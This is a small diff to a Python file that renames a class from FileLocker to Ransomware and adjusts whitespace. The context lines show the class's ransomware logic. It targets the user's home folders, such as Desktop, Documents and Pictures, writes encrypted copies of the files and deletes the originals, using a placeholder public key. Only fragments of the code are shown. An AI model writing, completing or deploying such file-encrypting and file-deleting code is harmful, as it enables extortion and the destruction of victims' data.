@@ -8,7 +8,7 @@ import json
 
 public_key = None # Replace with actual public key in PEM format
 
-class FileLocker:
+class Ransomware:
     def __init__(self):
         self.home = Path.home()
         self.locations = ["Desktop", "Documents", "Downloads", "Music", "Pictures", "Videos", "Public"]
@@ -63,7 +63,7 @@ class FileLocker:
             outfile.write(encryptor.finalize())
         
         input_path.unlink()
-    
+
     def find_files(self):
         for location in self.locations:
             folder = self.home / location
